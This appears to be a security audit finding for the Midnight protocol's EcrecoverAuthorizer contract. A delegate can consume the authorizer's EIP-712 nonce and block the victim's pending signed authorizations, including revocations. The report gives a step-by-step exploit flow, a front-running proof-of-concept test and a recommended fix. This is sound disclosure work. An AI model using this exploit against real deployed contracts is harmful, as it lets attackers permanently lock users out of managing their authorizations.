Audit Report

## Title
Authorized Delegate Can Consume Authorizer's Nonce via Delegated Signature, Permanently Blocking EcrecoverAuthorizer Usage — (`src/periphery/EcrecoverAuthorizer.sol`)

## Summary
`EcrecoverAuthorizer.setIsAuthorized` post-increments `nonce[authorization.authorizer]` at line 26 before the signer is identified, and the signer check at lines 33–36 accepts any address for which `IMidnight.isAuthorized(authorizer, signer)` returns `true`. A delegate of the victim can therefore sign an `Authorization` struct naming the victim as `authorizer`, pass both checks, and permanently consume the victim's nonce — invalidating any pending victim-signed authorizations at that nonce. The attack is repeatable every block at zero capital cost.

## Finding Description
In `src/periphery/EcrecoverAuthorizer.sol`:

```solidity
// Line 26 — nonce consumed before signer is known
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

// Lines 33–36 — delegate accepted as valid signer
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// Lines 46–47 — Midnight call succeeds if EcrecoverAuthorizer is authorized by victim
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

The nonce increment at line 26 is not rolled back when the signer is a delegate rather than the authorizer. `Midnight.isAuthorized` is a flat, permissionless mapping (`src/Midnight.sol` line 192) — any address the victim has ever authorized satisfies the check.

**Exploit flow:**

1. **Preconditions:** `isAuthorized[victim][attacker] == true` (victim authorized attacker as an operator/keeper) and `isAuthorized[victim][EcrecoverAuthorizer] == true` (victim uses the sig-based flow). Victim has a pending off-chain signed `Authorization{authorizer=victim, nonce=N}`.
2. Attacker constructs `Authorization{authorizer=victim, authorized=<any third address>, isAuthorized=<any>, nonce=N, deadline=<future>}` and signs it with the **attacker's own key**.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
4. Line 26: `N == nonce[victim]` → passes; `nonce[victim]` becomes `N+1`.
5. Lines 33–36: `signer == victim` → false; `isAuthorized[victim][attacker]` → true → passes.
6. Lines 46–47: `IMidnight.setIsAuthorized(thirdAddress, <any>, victim)` executes (EcrecoverAuthorizer is authorized by victim).
7. Victim's nonce is now `N+1`; victim's pending authorization at nonce `N` reverts with `InvalidNonce`.
8. Attacker sets `authorized` to a third address (not themselves), preserving their own authorization, and repeats for `N+1`, `N+2`, etc.

The existing `testEcrecoverAuthorizerInvalidSignature` test (`test/SetIsAuthorizedWithSigTest.sol` lines 88–97) only verifies that a fully unauthorized signer is rejected; it does not cover the authorized-delegate path.

## Impact Explanation
An attacker holding any Midnight authorization from the victim can grief the victim's `EcrecoverAuthorizer` nonce sequence indefinitely. Any off-chain signed authorizations the victim has distributed — including emergency revocations of malicious operators — are rendered permanently invalid. If the victim is a smart contract that relies solely on the EIP-712 signature flow through `EcrecoverAuthorizer`, they lose all ability to manage their Midnight authorizations, constituting a permanent freeze of a critical authorization management path.

## Likelihood Explanation
Preconditions are common: any user who has authorized an operator (keeper, ratifier, liquidation bot) on Midnight while also having authorized `EcrecoverAuthorizer` is vulnerable. The attacker requires no capital, no special timing, and no privileged access beyond a pre-existing authorization from the victim. The attack is executable every block, front-runnable against any victim-submitted `setIsAuthorized` transaction, and costs only gas.

## Recommendation
Restrict the signer check to the authorizer only — do not accept delegates as valid signers for the nonce-based EIP-712 flow. The delegate path already exists via direct `Midnight.setIsAuthorized` calls; the EcrecoverAuthorizer's nonce mechanism is specifically designed to bind a signature to the authorizer's key:

```solidity
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
require(signer != address(0), InvalidSignature());
require(signer == authorization.authorizer, Unauthorized()); // remove delegate branch
```

If delegate signing is intentionally desired, the nonce must be keyed to the signer, not the authorizer (e.g., `nonce[signer]`), so a delegate's action cannot consume the authorizer's nonce sequence.

## Proof of Concept
```solidity
// Setup
vm.prank(victim);
midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
vm.prank(victim);
midnight.setIsAuthorized(attacker, true, victim);

// Victim signs nonce=0 authorization (e.g., to revoke attacker)
Authorization memory victimAuth = Authorization({
    authorizer: victim, authorized: attacker, isAuthorized: false,
    nonce: 0, deadline: block.timestamp + 1 days
});
Signature memory victimSig = signAuthorization(victimAuth, victim);

// Attacker front-runs with their own signature at nonce=0
Authorization memory attackAuth = Authorization({
    authorizer: victim, authorized: address(0xdead), isAuthorized: true,
    nonce: 0, deadline: block.timestamp + 1 days
});
Signature memory attackSig = signAuthorization(attackAuth, attacker);
ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig); // succeeds, nonce[victim] = 1

// Victim's revocation now reverts
vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

// Attacker still authorized — attack repeatable for nonce=1, 2, ...
assertTrue(midnight.isAuthorized(victim, attacker));
```
